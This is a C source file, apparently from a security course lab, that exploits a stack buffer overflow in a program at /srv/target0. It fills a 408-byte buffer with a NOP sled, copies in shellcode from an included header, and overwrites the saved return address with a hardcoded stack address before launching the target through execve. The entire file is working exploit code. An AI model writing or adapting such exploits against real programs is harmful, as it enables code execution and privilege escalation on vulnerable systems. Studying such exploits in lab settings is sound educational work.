#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

const int BSIZE = 408;
const int SHSIZE = sizeof(shellcode) - 1;
const uint32_t RET = 0xffffdb2c;

void prep(char *buf) {
    memset(buf, 0x90, BSIZE);
    buf[BSIZE] = '\0';
    memcpy(buf, shellcode, SHSIZE);
    *(uint32_t*)(buf + BSIZE - 4) = RET;
}

int main(void)
{
    char *args[3];
    char *env[1];
    char buf[BSIZE + 1];

    prep(buf);

    args[0] = TARGET;
    args[1] = buf;
    args[2] = NULL;

    env[0] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}